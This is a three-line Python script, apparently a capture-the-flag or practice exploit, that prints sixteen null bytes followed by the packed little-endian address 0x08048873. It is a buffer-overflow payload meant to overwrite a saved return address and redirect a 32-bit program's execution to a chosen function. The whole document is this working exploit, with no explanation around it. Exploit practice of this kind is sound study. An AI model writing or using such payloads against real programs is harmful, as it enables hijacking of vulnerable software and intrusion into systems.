import sys;

from struct import pack
print("\00"*16 + pack("<I",0x08048873))

